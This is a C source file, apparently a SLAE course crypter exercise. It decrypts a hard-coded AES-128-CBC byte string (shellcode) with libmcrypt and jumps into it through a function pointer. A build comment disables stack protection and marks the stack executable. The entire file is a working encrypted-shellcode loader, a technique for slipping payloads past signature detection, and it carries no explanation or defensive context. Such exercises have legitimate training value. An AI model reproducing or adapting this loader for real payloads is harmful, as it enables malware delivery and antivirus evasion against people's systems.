// gcc -o decrypt decrypt.c -lmcrypt -fno-stack-protector -z execstack

#include <stdio.h>
#include <string.h>
#include <mcrypt.h>

int main()
{
    char cipher_text[] = "\x55\x5A\x7D\x5E\x60\xAE\xDB\x46\x57\xB6\x14\x24\x61\x5C\x7F\x35\x1D\x29\xBD\xF5\x5E\x52\xB5\xCF\x7D\x34\x60\x8B\x05\x2B\xBC\xFA\x80";
    char initialization_vector[] = "SLAE1261SLAE1261";
    char password[] = "securitytubetube";
    int password_length = 16;
    int c_text_length = 33;

    MCRYPT algorithm = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
    mcrypt_generic_init(algorithm, password, password_length, initialization_vector);
    mdecrypt_generic(algorithm, cipher_text, c_text_length);
    mcrypt_generic_deinit(algorithm);
    mcrypt_module_close(algorithm);

    int (*ret)() = (int(*)())cipher_text;
    ret();
}
